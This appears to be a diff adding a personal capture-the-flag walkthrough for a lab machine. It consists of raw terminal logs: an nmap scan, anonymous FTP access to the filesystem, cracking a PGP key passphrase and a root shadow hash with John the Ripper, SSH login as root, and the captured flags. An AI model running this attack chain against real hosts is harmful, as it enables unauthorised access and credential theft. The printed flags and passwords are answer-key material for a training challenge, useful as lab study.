@@ -1,0 +1,219 @@
+============================================================================================================
+Step 1:  nmap -sV -sV 10.201.62.229  
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 15:35 +07
+Nmap scan report for 10.201.62.229
+Host is up (0.33s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 3.68 seconds
+============================================================================================================
+Step 2: Connect ftp to 10.201.62.229
+ftp 10.201.62.229
+Connected to 10.201.62.229.
+220 (vsFTPd 3.0.3)
+Name (10.201.62.229:vhianph): anonymous
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||23604|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
+drwxr-xr-x   17 0        0            3700 Nov 16 00:33 dev
+drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
+lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
+lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
+drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
+drwx------    2 0        0           16384 Aug 11  2019 lost+found
+drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
+drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
+drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
+drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
+dr-xr-xr-x   84 0        0               0 Nov 16 00:33 proc
+drwx------    3 0        0            4096 Aug 11  2019 root
+drwxr-xr-x   18 0        0             540 Nov 16 00:33 run
+drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
+drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
+dr-xr-xr-x   13 0        0               0 Nov 16 00:33 sys
+drwxrwxrwt    9 0        0            4096 Nov 16 00:33 tmp
+drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
+drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
+lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
+lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
+226 Directory send OK.
+ftp> cd home 
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||57663|)
+150 Here comes the directory listing.
+drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
+226 Directory send OK.
+ftp> cd melodias
+250 Directory successfully changed.
+ftp> ls
+229 Entering Extended Passive Mode (|||22573|)
+150 Here comes the directory listing.
+-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
+226 Directory send OK.
+ftp> cd user.txt
+550 Failed to change directory.
+ftp> get user.txt
+local: user.txt remote: user.txt
+229 Entering Extended Passive Mode (|||25237|)
+150 Opening BINARY mode data connection for user.txt (33 bytes).
+100% |***********************************|    33      503.54 KiB/s    00:00 ETA
+226 Transfer complete.
+33 bytes received in 00:00 (0.07 KiB/s)
+ftp> exit 
+221 Goodbye.
+============================================================================================================
+┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ cat user.txt 
+606083fd33beb1284fc51f411a706af8
+============================================================================================================================================================================================================================
+Step 3: ┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ ls
+ 46635.py    'Crack the hash.txt'   get-pip.py   id_rsa                  nmap_allports.gnmap   nmap_allports.xml   nmap_basic.nmap   private.asc   rockyou.txt     Simple-CTF.txt               user.txt     'Wgel CTF.txt'
+ backup.pgp   exploit.py            Hash.txt     lqv0105.forlearn.ovpn   nmap_allports.nmap    nmap_basic.gnmap    nmap_basic.xml    reports       root_flag.txt  'Step 1 nmap sV 10 201.txt'   wgelctf.txt
+                                                                                                                                                                                                                                              
+┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ gpg --import private.asc
+
+gpg: keybox '/home/vhianph/.gnupg/pubring.kbx' created
+gpg: /home/vhianph/.gnupg/trustdb.gpg: trustdb created
+gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
+gpg: key B92CD1F280AD82C2/B92CD1F280AD82C2: error sending to agent: No passphrase given
+gpg: error building skey array: No passphrase given
+gpg: error reading 'private.asc': No passphrase given
+gpg: import from 'private.asc' failed: No passphrase given
+gpg: Total number processed: 0
+gpg:               imported: 1
+gpg:       secret keys read: 1
+                                                                                                                                                                                                                                              
+┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ gpg2john private.asc > hash.txt
+
+
+File private.asc
+                                                                                                                                                                                                                                              
+┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+xbox360          (anonforce)     
+1g 0:00:00:00 DONE (2025-11-16 15:59) 4.545g/s 4254p/s 4254c/s 4254C/s xbox360..yourmom
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                                                                                                                                                                                                                                              
+┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ gpg --import private.asc
+
+gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
+gpg: key B92CD1F280AD82C2: secret key imported
+gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
+gpg: Total number processed: 2
+gpg:              unchanged: 2
+gpg:       secret keys read: 1
+gpg:   secret keys imported: 1
+                                                                                                                                                                                                                                              
+┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ gpg --decrypt backup.pgp
+
+gpg: encrypted with elg512 key, ID AA6268D1E6612967, created 2019-08-12
+      "anonforce <melodias@anonforce.nsa>"
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18120:0:99999:7:::
+uuidd:*:18120:0:99999:7:::
+melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
+sshd:*:18120:0:99999:7:::
+ftp:*:18120:0:99999:7:::       
+============================================================================================================================================================================================================================
+Step 4: Copy root...... into hash.txt
+┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ nano hash.txt   
+                                                                                
+┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ john hash.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hikari           (root)     
+1g 0:00:00:01 DONE (2025-11-17 14:43) 0.6993g/s 5012p/s 5012c/s 5012C/s horoscope..emoemo
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+============================================================================================================================================================================================================================
+Step 5: ┌──(vhianph㉿vhianph)-[~/Downloads/Tryhackme]
+└─$ ssh root@10.201.13.123                
+The authenticity of host '10.201.13.123 (10.201.13.123)' can't be established.
+ED25519 key fingerprint is: SHA256:+bhLW3R5qYI2SvPQsCWR9ewCoewWWvFfTVFQUAGr+ew
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.201.13.123' (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+root@10.201.13.123's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+root@ubuntu:~# ls 
+root.txt
+root@ubuntu:~# cat root.txt 
+f706456440c7af4187810c31c6cebdce
+root@ubuntu:~# Connection to 10.201.13.123 closed by remote host.
+Connection to 10.201.13.123 closed.
+============================================================================================================================================================================================================================
+=> User flag: 606083fd33beb1284fc51f411a706af8
+=> Root flag: f706456440c7af4187810c31c6cebdce
